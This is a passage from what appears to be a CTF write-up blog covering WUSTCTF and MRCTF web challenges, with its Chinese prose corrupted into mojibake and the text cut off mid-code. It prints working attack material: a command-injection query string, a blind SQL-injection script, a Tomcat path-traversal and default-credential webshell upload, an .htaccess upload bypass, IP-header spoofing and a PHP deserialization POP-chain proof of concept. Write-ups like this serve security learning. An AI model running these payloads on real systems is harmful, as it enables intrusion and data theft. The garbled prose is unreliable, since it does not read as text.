<p>ç¬¬äºŒå±‚å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜<br><code>$md5==md5($md5)</code><br>ä½†æ˜¯åŸæ¥æ ¡èµ›æ€»ç»“æ—¶å°±å¼ºè°ƒè¿‡ï¼Œç½‘ä¸Šä¸€ç›´ä»¥æ¥çš„è¯´æ³•å¾ˆä¸å‡†ç¡®ã€‚å¹¶éæ˜¯0eå¼€å¤´æ‰ä¼šè¢«åˆ¤ä½œ0.è€Œæ˜¯å› ä¸º0eå¼€å¤´ä¸”çº¯æ•°å­—ç„¶åæ‰èƒ½è¢«è½¬ä¸º0<br><a href="https://www.jianshu.com/p/52f04f85824e" target="_blank" rel="noopener">https://www.jianshu.com/p/52f04f85824e</a><br>æ•…æˆ‘ä»¬éœ€è¦0eå¼€å¤´çº¯æ•°å­—çš„æ•°ï¼Œä½¿å¾—å…¶MD5å€¼0eå¼€å¤´ä¸”çº¯æ•°å­—ã€‚<br>å› æ­¤è¿™ä¸ªä¸€å®šæ˜¯è¦è„šæœ¬è·‘çš„ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æ”¾å¼ƒhhhã€‚æ‰¾é˜Ÿå‹è¦äº†ä»¥å‰è®²è¿‡è¿™ä¸ªtrickçš„æ–‡ç« ï¼Œå¾—åˆ°äº†è¿™ä¸ªç¥å¥‡æ•°å­—0e215962017</p>
<p>ç¬¬ä¸‰å±‚åŸºç¡€è‡³æã€‚<code>ca\t</code>å¯ä»¥ç»•è¿‡å…³é”®å­—ï¼Œ<code>${IFS}</code>æ›¿ä»£ç©ºæ ¼ï¼Œè¯»flagå¯ä»¥ç›´æ¥ç”¨<code>fll*</code>ï¼Œæˆ–è€…ç›´æ¥cat <code>cat `ls`</code> å³å¯ã€‚<br>ä¸»è¦è¿˜æ˜¯è¢«äººæ…å±å¯¼è‡´å¤šè¯•äº†å¥½ä¹…,è¿˜é¡ºä¾¿æ‰“ç®—å¼¹shellã€‚ç»“æœè¯•äº†5ç§æ–¹æ³•éƒ½æ²¡æˆ,çœŸçš„æ°”äºº<br>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;7e4&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;ca\t$&#123;IFS&#125;&#96;ls&#96;</span><br></pre></td></tr></table></figure>


<h2 id="é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="é¢œå€¼æˆç»©æŸ¥è¯¢"></a>é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>è£¸çš„æ•°å€¼å¸ƒå°”ç›²æ³¨ï¼Œç›´æ¥ä¸Šifåˆ†æµå°±å®Œäº‹ã€‚<br>å¥½åƒè¿‡æ»¤äº†ç©ºæ ¼ï¼Œé‚£å°±æ‹¬å·å¤šå¥—ä¸€ä¸‹ã€‚<br>å› ä¸ºæ‰“é”™äº†å‚æ•°<code>stunum</code>ï¼Œå¯¼è‡´åªæ‹¿åˆ°ä¸‰è¡€ã€‚æ°”æ­»äº†â€¦ä»¥åä¸€å®šç›´æ¥å¤åˆ¶ç²˜è´´urlã€‚åƒå¤§äºã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://101.200.53.102:10114/index.php?stunum='</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-"</span>:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(group_concat(value))from(flag)),"</span>+str(i)+<span class="string">",1))="</span> + str(ord(str1)) + <span class="string">",1,2)"</span></span><br><span class="line">        payload = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=str1</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><del>æœ‰é“1è§£é¢˜è²Œä¼¼å¾ˆé¡¶å°±æ²¡æœ‰çœ‹ã€‚</del></p>
<h2 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h2><p>åˆ°buuä¸Šå¤ç°äº†ã€‚ä»”ç»†åšä¼šå‘ç°è¿˜æ˜¯ç»†èŠ‚ä¸Šé—®é¢˜æ¯”è¾ƒå¤šã€‚<br>é¦–å…ˆæ˜¯åˆ†æã€‚å› ä¸ºé¢˜ç›®æ˜¾ç¤ºçš„é¡µé¢æ˜¯tomcaté»˜è®¤çš„<code>/examples</code>è·¯ç”±ã€‚é‚£ä¹ˆè¯´æ˜æ˜¯ç”¨examplesåšçš„æ ¹ç›®å½•<br><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a><br>ç„¶åæ˜¯è¿™ä¸ªæ–‡æ¡£ã€‚<br>å¯ä»¥æ„é€ è·¯å¾„ç©¿è¶Šï¼Œæ¥åˆ°å…¶ä»–è·¯å¾„ä¸‹ã€‚æ¯”å¦‚æ­¤å¤„ä¸ºäº†getshell,è¿›å…¥<code>/manager</code>æ„é€ <code>/..;/manager</code><br>ä¹‹åä¸€ä¸ªtomcat:tomcatçš„å¼±å£ä»¤ã€‚<br>å…·ä½“getshellæµç¨‹å¯ä»¥å‚è€ƒvulhubä¸Štomcat/tomcat8çš„æ¼æ´Tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´ã€‚[<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8]" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8]</a><br>(<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)æˆ‘ä¹Ÿç®€å•å¤ç°äº†ä¸‹ï¼Œå¯ä»¥å»æˆ‘çš„vulhubå¤ç°æ–‡ç« é‚£çœ‹ã€‚" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)æˆ‘ä¹Ÿç®€å•å¤ç°äº†ä¸‹ï¼Œå¯ä»¥å»æˆ‘çš„vulhubå¤ç°æ–‡ç« é‚£çœ‹ã€‚</a><br>å…ˆç»™å‡ºwebshell.jspä¸webshell.warçš„ç”Ÿæˆæ–¹æ³•</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>å¸¦å›æ˜¾ä¸å¯†ç çš„jspï¼Œæ¯”è¾ƒå¥½ç”¨ã€‚<br>ç„¶åå‘½ä»¤è¡Œå¯ä»¥ç”Ÿæˆwar<br><code>jar cvf webshell.war webshell.jsp</code><br>è²Œä¼¼ç›´æ¥å‹ç¼©jspæˆzipç„¶åæ”¹åç¼€ä¸ºwarä¹Ÿå¯ä»¥ã€‚<br>è¿›å…¥åè‡ªç„¶æ˜¯ä¸Šä¼ waråŒ…äº†ã€‚ä½†æ˜¯å¾ˆå¿«å‘ç°ç‚¹å‡»ä¸Šä¼ åè¿”å›404ã€‚è€Œå®ƒçš„è·¯å¾„ç»™çš„æ˜¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;examples&#x2F;..;&#x2F;manager&#x2F;html&#x2F;upload?org.apache.catalina.filters.CSRF_NONCE&#x3D;A226F07F06C2C983EE2911A5963BFA84</span><br></pre></td></tr></table></figure>
<p>çœ‹æ¥æ˜¯åˆä»æ ¹ç›®å½•å¼€å§‹åŠ è½½è·¯å¾„äº†ï¼Œè¿™ä¸ªç”¨åŒæ ·çš„æ–¹æ³•ï¼Œå°†è·¯å¾„æ”¹æˆ<br><code>/..;/manager/html/upload......</code>å³å¯<br>ä¸è¿‡å¾ˆå¿«ä¼šå‘ç°401ã€‚æœªæˆæƒè®¿é—®ã€‚å¦‚æœç†Ÿæ‚‰tomcatçš„å¾ˆå¿«èƒ½ååº”è¿‡æ¥æ˜¯å°‘äº†headeré‡Œçš„è®¤è¯ï¼Œå½“ç„¶åœ¨æˆåŠŸè®¿é—®åå°æ—¶æŠ“åŒ…ä¹Ÿèƒ½çœ‹åˆ°è‡ªå·±çš„headerä¸­æœ‰è®¤è¯å¤´ã€‚<br><code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code><br>åé¢å°±æ˜¯tomcat:tomcatçš„base64ç¼–ç ã€‚è¿™é‡Œæ˜¾ç„¶å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡æ„é€ è·¯å¾„ç©¿è¶Šçš„é—®é¢˜ï¼Œæ²¡æœ‰åœ¨uploadæ—¶è‡ªåŠ¨å¸¦ä¸Šã€‚<br>é‚£ä¹ˆç»§ç»­ä¸Šä¼ ï¼Œå‘ç°403.åªèƒ½æ˜¯cookieçš„é—®é¢˜äº†ã€‚å›å¤´å»çœ‹è®¿é—®<code>/..;/manager/html</code>æ—¶å°±å­˜åœ¨set-cookieçš„è¿”å›ã€‚é‚£ä¹ˆåªèƒ½æ˜¯ç¼ºcookieäº†ã€‚<br>å…·ä½“åšæ³•ï¼šé‡æ–°è®¿é—®ä¸€é<code>/..;/manager/html</code>ä»è¿”å›å¤´å–ä¸€ä¸ªcookie.ç„¶åä¸Šä¼ æ—¶æŠ“åŒ…æ‹¦æˆªï¼ŒæŠŠè®¤è¯è·Ÿcookieä»¥åŠè®¿é—®åœ°å€å…¨éƒ¨æ”¹å¥½ï¼Œç›´åˆ°200ä¸ºæ­¢ã€‚<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/8.PNG" alt><br>ç„¶åå°±å¯ä»¥è®¿é—®webshellè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚è¿™é‡Œflagæ¯”èµ›æ˜¯åœ¨æ ¹ç›®å½•çš„æ–‡ç« ä¸­ï¼Œbuuæ˜¯åœ¨æ ¹ç›®å½•.<br><code>/..;/webshell/exp.jsp?pwd=023&amp;i=cat%20/flagggg</code></p>
<h1 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a>MRCTF</h1><p>å¤©ç’‡çš„æ¯”èµ›ç›¸å¯¹WUSTå°±éš¾ä¸€ç‚¹ï¼Œç„¶è€Œè¿˜æ˜¯ä¸€å †å¥—å¨ƒã€‚å¿ƒé‡Œè‹¦ã€‚å¥—å¨ƒé¢˜å¤šçœŸçš„æ˜¯CTFæ¯”èµ›æ€ªç°çŠ¶äº†,è„±ç¦»äº†CTFçš„æœ¬è´¨â€¦</p>
<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><p>è€å¥—å¨ƒäº†ã€‚æ–¹æ³•éƒ½è€å¥—äº†ã€‚<br>ç¬¬ä¸€æ­¥ä¸€ä¸ªMD5ç¢°æ’ï¼Œç½‘ä¸Šä¸€å †ç°æˆçš„ã€‚<br>ç¬¬äºŒæ­¥ä¸€ä¸ªisnumeric()ï¼Œåªéœ€è¦åœ¨æ•°å­—åéšä¾¿åŠ ä¸ªç¬¦å·å°±å¯ä»¥ç»•è¿‡</p>
<h2 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h2><p>æ–‡ä»¶ä¸Šä¼ åŸºæœ¬å¥—è·¯ï¼Œè¯•äº†ä¸‹å‘ç°phpå¯è§£æçš„å‡ ä¸ªåç¼€éƒ½æ²¡äº†ã€‚é‚£è¯•è¯•<code>.htaccess</code>å‘ç°å¯ä»¥ã€‚é‚£å°±æ²¡äº‹äº†ï¼Œç»•æ–‡ä»¶æ£€æŸ¥ä¸Šä¼ jpgå›¾ç‰‡é©¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addtype application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>


<h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>æˆ‘æ‰¿è®¤è¿™é¢˜æ˜¯æˆ‘è‡ªå·±èœäº†ã€‚<br>å¼€å§‹å‰ç«¯ä¸€ä¸ªéªŒè¯MD5ï¼Œä½†æ˜¯æ˜¯ä¸ªjsã€‚æˆ‘è¿˜è·‘å»æœjsçš„MD5å¼±ç±»å‹ï¼Œå‘ç°å¥½åƒå°±æ²¡æœ‰è¿™ä¸ªtrickå•Šâ€¦</p>
<p>åæ¥æ‰æ³¨æ„flag.phpè¯´ä»–è®°å½•äº†æ‰€æœ‰è´­ä¹°è€…ip<br>æ‰€ä»¥<code>X-Forwarded-For:127.0.0.1</code>è®¿é—®å³å¯</p>
<h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><p>å…ˆæ˜¯è¦ç»•ç¬¬ä¸€å±‚ï¼Œä½†æ˜¯æ€ä¹ˆçœ‹ç€å°±åƒæˆ‘ä»¬nctfçš„é¢˜å‘¢ï¼Ÿ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨<code>b.u.p.t</code>æ›¿ä»£ï¼Œä»¥åŠåœ¨23333ååŠ ä¸Š%0aç»•è¿‡preg_match()</p>
<p>ç¬¬äºŒå±‚<br>é¦–å…ˆä¸€å †jsfuckï¼Œæ‰”Chromeæ§åˆ¶å°å¾—åˆ°ä¸€ä¸ªæç¤ºpost Merak,ä¼ ä¸ªå€¼å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ¥ç€è€å¥—å¨ƒäº†ã€‚<br>é¦–å…ˆæ˜¯<code>getIp()</code>å‡½æ•°ï¼Œå»å®˜ç½‘æŸ¥äº†ä¸‹ï¼Œæ˜¯headerå¯æ§ã€‚é‚£å°±headerè®¾ç½®ä¸º<code>Client-IP:127.0.0.1</code><br>ç„¶åä¸ºäº†<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>è¿™æ­¥è€æ–¹æ³•ä½¿ç”¨dataåè®®<br><code>data://text/plain,todat is a happy day</code><br>æœ€åä¸€ä¸ªfileå…ˆç”¨ä¸Šé¢ç»™çš„å‡½æ•°æ”¹æ”¹ç¼–ç ä¸‹å³å¯ã€‚</p>
<h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>popé“¾æ„é€ ,å®è¯è¯´ä¸‰ä¸ªç±»çš„popå¾ˆåŸºç¡€ï¼Œä¸è¿‡æˆ‘å¼€å§‹è§‰å¾—è¿™ä¸ªèµ·ç‚¹è´¼è¯¡å¼‚ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç›®æ ‡è‡ªç„¶æ˜¯include flag.phpäº†ã€‚ä¸è¿‡æœ€å¥½ç›´æ¥ä¼ªåè®®è¯»ã€‚</p>
<p>é¦–å…ˆè¦è§¦å‘<code>__toString</code>é‚£å°±å…ˆæ¥ä¸ªechoã€‚ä¹Ÿå°±æ˜¯è¯´è¿˜å¾—å†æ¥ä¸ªShowç±»å¯¹è±¡ç½®ä¸ºå®ƒçš„sourceå±æ€§,echoæ—¶è§¦å‘.Showç±»å¸¦Showç±»,è®²ç©¶ã€‚</p>
<p>ä¹‹å<code>$this-&gt;str-&gt;source</code>æ˜æ˜¾å¯ä»¥è§¦å‘Testçš„<code>__get()</code>ï¼Œç„¶åè¿”å›å€¼æ˜¯å‡½æ•°ï¼Œé‚£å°±å¯ä»¥è§¦å‘Modiferçš„<code>__invoke()</code>äº†ã€‚</p>
<p>å¾ˆç®€å•çš„é“¾å­ï¼Œå°±æ˜¯ç¬¬ä¸€æ­¥è‡ªå·±å¼€å§‹çŠ¯å‚»ä»¥ä¸º__toString()è§¦å‘æ˜¯echoæ—¶è‡ªåŠ¨å°±æœ‰çš„ï¼Œæƒ³äº†åŠå¤©ç¡®è®¤åº”è¯¥è¿˜æ˜¯å¾—å¯¹è±¡echoæ‰ä¼šè§¦å‘ã€‚è¿™ç‚¹ä¸èƒ½æ··æ·†ã€‚<br>poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$b=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source=$b;</span><br><span class="line">$b-&gt;str=<span class="keyword">new</span> Test();</span><br><span class="line">$b-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure>



<h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>æç¤ºaudité‚£å°±çœ‹çœ‹æºç æ³„éœ²ã€‚å‘ç°<a href="http://www.zipï¼Œç»“æœä¸Šæ¥å°±åªæœ‰ä¸€ä¸ªindex.php,è¿˜ä»¥ä¸ºæœ‰å¾ˆå¤šæºç " target="_blank" rel="noopener">www.zipï¼Œç»“æœä¸Šæ¥å°±åªæœ‰ä¸€ä¸ªindex.php,è¿˜ä»¥ä¸ºæœ‰å¾ˆå¤šæºç </a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 